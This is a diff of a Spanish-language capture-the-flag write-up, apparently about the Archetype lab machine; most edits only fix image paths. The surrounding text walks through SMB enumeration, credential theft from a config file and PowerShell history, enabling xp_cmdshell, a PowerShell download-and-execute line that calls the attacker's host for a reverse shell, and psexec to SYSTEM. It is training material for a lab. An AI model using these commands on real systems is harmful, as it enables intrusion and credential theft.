@@ -12,7 +12,6 @@ tag:
 comments: true
 ---
 ## Maquina Windows : EASY!!
-![logo](https://githubraw.com/H4ckM1nd/h4ckm1nd.github.io/master/Capturas/Portadas/lame-portada.png)
 
 ![LOGO](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/Capturas/ARCHETYPE/logo%20maquina.png)
 
@@ -40,11 +39,11 @@ El protocolo SMB se utiliza para compartir archivos y normalmente almacenan arch
 
     > smbclient -N -L\\\\{IP objetivo}\\
 
-> -N = Indica conectarnos sin contraseña
+    > -N = Indica conectarnos sin contraseña
 
-> -L = Despliega los servicios compartidos disponibles en una lista
+    > -L = Despliega los servicios compartidos disponibles en una lista
 
-![SMBCLIENT ENUM](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/_posts/CAPTURAS/Archetype/Imagenes/archetype%20smbclient%20ennum1.png)
+![SMBCLIENT ENUM](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/Capturas/ARCHETYPE/archetype%20smbclient%20ennum1.png)
 
 Vemos un recurso interesante llamado backups(copias de seguridad) el cual podría contener información interesante. Para conectarnos a esa carpeta:
 
@@ -53,7 +52,7 @@ Vemos un recurso interesante llamado backups(copias de seguridad) el cual podrí
 Una vez conectados pasamos a listar el contenido de dicha carpeta utilizando el comando dir ya que recordar que estamos ante una maquina Windows.
 Vemos un archivo llamado prod.dtsConfig que puede que contenga información.
 
-![SMBCLIENT CONECT](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/_posts/CAPTURAS/Archetype/Imagenes/smbclient%202%20conexion%20carpeta%20baksups.png)
+![SMBCLIENT CONECT](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/Capturas/ARCHETYPE/smbclient%202%20conexion%20carpeta%20baksups.png)
 
 Para descargarlo a nuestra maquina y poder ver su contenido utilizaremos el comando get.
 (el contenido se guardará en el directorio actual donde nos encontramos trabajando en nuestra maquina)
@@ -66,7 +65,7 @@ Ahora para leer el contenido de dicho archivo ya desde nuestra maquina, lo harem
 
 El archivo contiene las credenciales para el usuario local de Windows ARCHETYPE\sql_svc.
 
-![CAT PROD.DTSCONFIG](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/_posts/CAPTURAS/Archetype/Imagenes/archetype%20cat%20prod.dt.config.png)
+![CAT PROD.DTSCONFIG](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/Capturas/ARCHETYPE/archetype%20cat%20prod.dt.config.png)
 
 Con las credenciales obtenidas de un usuario de SQL server, ahora solo necesitamos una forma de conectarnos y autentificarnos en el servidor SQL. Para conectarnos podemos utilizar la herramienta Impacket, la cual incluye un script en Python llamado mssqclient.py que nos permite trabajar con protocolos de red.
 Para entender un poco más que es Impacket y cómo utilizarlo:
@@ -99,7 +98,7 @@ Ahora ya Podemos utilizar el script de Python en cuestión:
 
 Ingresamos contraseña obtenida anteriormente y ya estaríamos conectados habilitándosenos así una terminal de SQL.
 
-![MMSCLIENT](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/_posts/CAPTURAS/Archetype/Imagenes/archetype%20mmsqlclient.py%201%20inicio%20sesion.png)
+![MMSCLIENT](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/Capturas/ARCHETYPE/archetype%20mmsqlclient.py%201%20inicio%20sesion.png)
 
 Con el comando help LISTAMOS LAS OPCIONES de la shell de SQL
 
@@ -113,7 +112,7 @@ Lo primero que tenemos que hacer ahora es comprobar si tenemos permisos de admin
 
     > SELECT IS_SRVROLEMEMBER('sysadmin')
 
-![SQL permisos](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/_posts/CAPTURAS/Archetype/Imagenes/archetype%20sql%20permisos%20tenemos%201%20null.png)
+![SQL permisos](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/Capturas/ARCHETYPE/archetype%20sql%20permisos%20tenemos%201%20null.png)
 
 Dicha entrada nos devuelve un valor de 1 que significa TRUE o lo qué es lo mismo, que si tenemos permisos de administrador en SQL server
 
@@ -139,7 +138,7 @@ Ahora ya podemos ejecutar comandos en el sistema. Para comprobarlo:
 
     > SQL> xp_cmdshell "whoami"
 
-![SQL whoami](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/_posts/CAPTURAS/Archetype/Imagenes/archetype%20xp_cmdshell%20prueba%20whoami.png)
+![SQL whoami](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/Capturas/ARCHETYPE/archetype%20xp_cmdshell%20prueba%20whoami.png)
 
 
 ## OBTENER REVERSE SHELL:
@@ -165,26 +164,26 @@ Antes de todo deberemos configurar una regla de firewall para permitir conexione
 -	sudo ufw allow from {ip maquina objetivo} proto tcp to any port 80,443
 -	sudo ufw status 
 
-![firewall](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/_posts/CAPTURAS/Archetype/Imagenes/archetype%20reglas%20ufw%20.png)
+![firewall](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/Capturas/ARCHETYPE/archetype%20reglas%20ufw%20.png)
 
 Con todo listo ejecutamos el comando SQL server para descargar nuestro backdoor en la maquina objetivo y crear nuestra reverse TCP shell.
 
 -	xp_cmdshell"powershell"IEX(NewObjectNet.WebClient).DownloadString(\"http://YourIP/nombre_script.ps1\");""
 
-![sqlinvokerevershell](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/_posts/CAPTURAS/Archetype/Imagenes/archetype%20sql%20reverse%20shell%201.png)
+![sqlinvokerevershell](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/Capturas/ARCHETYPE/archetype%20sql%20reverse%20shell%201.png)
 	
 Debería ejecutarse con éxito. El resultado en nuestro python http server que ejecuta nuestra página web de python debe mostrar un HTML 200 response code, mostrando una descarga exitosa de nuestro Powershell script.
 
 ASI YA DEBERIAMOS OBTENER UNA REVERSE SHELL EN NUESTRO EQUIPO.
 
-![netcat shell](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/_posts/CAPTURAS/Archetype/Imagenes/archetype%20revershell%20obtenida%20en%20kali.png)
+![netcat shell](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/Capturas/ARCHETYPE/archetype%20revershell%20obtenida%20en%20kali.png)
 
 Listamos contenido con dir y nos movemos al directorio escritorio. Listamos otra vez con dir y vemos la primera flag llamada user.txt
 Para leer su contenido usamos el comando type:
 
 -	type user.txt
 
-![flag1](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/_posts/CAPTURAS/Archetype/Imagenes/archetype%20ls%20directory%20flag%201.png)
+![flag1](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/Capturas/ARCHETYPE/archetype%20ls%20directory%20flag%201.png)
 
 ASI OBTENEMOS NUETRA PRIMERA FLAG
 
@@ -195,7 +194,7 @@ La cuenta en la que nos encontramos no tiene permisos de administrador, pero se 
 
 -	typeC:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 
-![flag1](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/_posts/CAPTURAS/Archetype/Imagenes/archetype%20cat%20console_history%20credencial%20admin.png)
+![flag1](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/Capturas/ARCHETYPE/archetype%20cat%20console_history%20credencial%20admin.png)
 	
 Esto nos revela que el disco backups se ha asignado utilizando las credenciales del administrador local. 
 
@@ -213,7 +212,7 @@ Podemos usar los de Impacket psexec.pypara obtener un shell privilegiado:
 
 -	Python3 psexec.py administrator@{ip objetivo}
 
-![flag2](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/_posts/CAPTURAS/Archetype/Imagenes/archetype%20root%20pwned.png)
+![flag2](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/Capturas/ARCHETYPE/archetype%20root%20pwned.png)
 
 Ingresamos la contraseña de administrador encontrada anteriormente y ya tendríamos una terminal con permisos de administrador.
 Veridficamos que los permisos de admin sean correctos con el comando whoami y efectivamente nos indica nt authority\system
@@ -221,8 +220,8 @@ Nos movemos al usuario administrator, vamos al escritorio y listando el contenid
 
 -	C:Users\Administrator\Desktop\>type root.txt
 
-![flag2](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/_posts/CAPTURAS/Archetype/Imagenes/archetype%20root%20flag%202.png)
+![flag2](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/Capturas/ARCHETYPE/archetype%20root%20flag%202.png)
 
 YA TENDRIAMOS NUESTRA FLAG ROOT Y LA MAQUINA ARCHETYPE PWNED!
 
-![flag2](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/_posts/CAPTURAS/Archetype/Imagenes/archetype%20pwned.png)
+![flag2](https://githubraw.com/H4ckM1nd/H4ckM1nd.github.io/master/Capturas/ARCHETYPE/archetype%20pwned.png)
